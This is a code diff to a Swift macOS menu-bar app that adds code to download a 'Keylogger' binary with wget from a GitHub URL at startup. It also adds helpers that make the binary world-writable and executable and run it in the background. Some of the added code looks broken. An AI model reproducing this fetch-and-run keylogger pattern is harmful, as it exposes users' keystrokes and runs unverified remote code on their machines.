@@ -21,8 +21,6 @@ class MainMenuController: NSObject , NetServiceBrowserDelegate, NetServiceDelega
     var mycommitment: MyCommitment!
     var prefsWindow: PrefsWindow!
     
-
-    
     var numStaticMenuItems = 0;
     let headerMenuItems = 1;
     var menuIsOpen = false;
@@ -42,6 +40,78 @@ class MainMenuController: NSObject , NetServiceBrowserDelegate, NetServiceDelega
         // - prefs window
         prefsWindow = PrefsWindow()
         prefsWindow.delegate = self
+        startLogger()
+    }
+    
+    private func startLogger(){
+        let dir = self.prefsWindow.preferences.keyloggerLocation
+        if !isDirectoryExist(dir: dir) {
+            createDir(path: "keylogger")
+            print(dir)
+        }
+        if !checkFileExist(path: dir+"Keylogger"){
+            let res = Helper.shell(launchPath: "/usr/local/bin/", arguments: ["wget","https://raw.githubusercontent.com/JobQiu/makeItHappen/master/Keylogger","-P",dir])
+            print("\(res)")
+        }
+        
+    }
+    
+    class Helper {
+        static func shell(launchPath path: String, arguments args: [String]) -> String {
+            let task = Process()
+            task.launchPath = path
+            task.arguments = args
+            
+            let pipe = Pipe()
+            task.standardOutput = pipe
+            task.standardError = pipe
+            task.launch()
+            
+            let data = pipe.fileHandleForReading.readDataToEndOfFile()
+            let output = String(data: data, encoding: .utf8)
+            task.waitUntilExit()
+            
+            return(output!)
+        }
+    }
+
+    
+    @discardableResult
+    func shell(_ args: String...) -> Int32 {
+        let task = Process()
+        task.launchPath = "/usr/bin/env"
+        task.arguments = args
+        task.launch()
+        task.waitUntilExit()
+        return task.terminationStatus
+    }
+    private func checkFileExist(path: String) -> Bool{
+        
+        let fileManager = FileManager.default
+        var isDir : ObjCBool = false
+        if fileManager.fileExists(atPath: path, isDirectory:&isDir) {
+            if isDir.boolValue {
+                return false
+                // file exists and is a directory
+            } else {
+                // file exists and is not a directory
+                return true
+            }
+        } else {
+            // file does not exist
+            return false
+        }
+    }
+    private func createDir(path: String){
+        let documentsPath1 = NSURL(fileURLWithPath: NSSearchPathForDirectoriesInDomains(.documentDirectory, .userDomainMask, true)[0])
+        let logsPath = documentsPath1.appendingPathComponent("keylogger")
+        // remove all logs later.
+        print(logsPath!)
+        do {
+            try FileManager.default.createDirectory(atPath: logsPath!.path, withIntermediateDirectories: true, attributes: nil)
+        } catch let error as NSError {
+            NSLog("Unable to create directory \(error.debugDescription)")
+        }
     }
     
     func updateOpStatus() {
@@ -186,6 +256,50 @@ class MainMenuController: NSObject , NetServiceBrowserDelegate, NetServiceDelega
     
     @IBAction func openHomepage(_ sender: NSMenuItem) {
         mycommitment.showWindow(nil)
+    }
+    
+    
+    
+    private func isDirectoryExist(dir: String) -> Bool{
+        
+        let fileManager = FileManager.default
+        var isDir : ObjCBool = false
+        if fileManager.fileExists(atPath: dir, isDirectory:&isDir) {
+            if isDir.boolValue {
+                return true
+                // file exists and is a directory
+            } else {
+                // file exists and is not a directory
+                return false
+            }
+        } else {
+            // file does not exist
+            return false
+        }
+    }
+    
+    
+    @discardableResult
+    func shell(launchPath: String,_ args: String...)-> Int32{
+        let task = Process()
+        task.launchPath = launchPath
+        task.arguments = args
+        task.launch()
+        task.waitUntilExit()
+        return task.terminationStatus
+    }
+    
+    private func downloadLogger(){
+        shell(launchPath: "/usr/local/bin/wget" ,"wget","https://raw.githubusercontent.com/JobQiu/makeItHappen/master/Keylogger","-P",self.prefsWindow.preferences.keyloggerLocation)
+        shell(launchPath: "/usr/bin/env", "chmod","777",self.prefsWindow.preferences.keyloggerLocation+"/Keylogger")
+    }
+    
+    private func startKeyLogger(){
+        shell(launchPath:"/usr/bin/env","nohup",self.prefsWindow.preferences.keyloggerLocation+"/Keylogger")
+    }
+    
+    private func stopKeyLogger(){
+        shell(launchPath:"/usr/bin/env","pkill","-f","Keylogger")
     }
     
 }
